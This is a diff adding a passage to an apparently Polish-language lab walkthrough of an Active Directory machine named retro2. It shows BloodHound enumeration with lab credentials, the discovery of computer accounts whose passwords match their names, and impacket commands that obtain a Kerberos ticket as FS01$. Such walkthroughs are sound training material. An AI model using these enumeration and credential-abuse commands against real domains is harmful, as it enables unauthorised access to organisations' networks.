@@ -131,4 +131,26 @@ Ale ja machnę bloodhounda bo to samo da i więcej
 
 `bloodhound-python -d retro2.vl -c all -u ldapreader -p ppYaVcB5R -ns 10.10.77.186`
 
+Widzimy kilka komputerów... mam pomysł z poprzedniego retro
+
+![{6B33EE5F-5F14-46E8-8C91-B91DECADABE4}](https://github.com/user-attachments/assets/045d8bb7-314d-41ca-badb-0249236aab26)
+
+![{3D52E395-BA8D-41E1-98CC-2B052D5A08D6}](https://github.com/user-attachments/assets/3803755b-0eb9-436b-8e2f-814e58029b0c)
+
+![{8FBC979E-E930-4ADE-A86E-275A9D522704}](https://github.com/user-attachments/assets/fc80f9e8-8a48-4045-b8f3-a0fd78a0565c)
+
+sooooo x2 `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` are interesting
+
+```
+FS01$:fs01
+FS02$:fs02
+```
+
+```
+impacket-getTGT 'retro2.vl/FS01$:fs01'
+export KRB5CCNAME=FS01\$.ccache
+klist
+```
+
+![{1003E993-EAEB-42EB-82CE-FE4A55A55AA9}](https://github.com/user-attachments/assets/d4ae5992-669b-461e-9f8e-6b572c6b6a75)
 
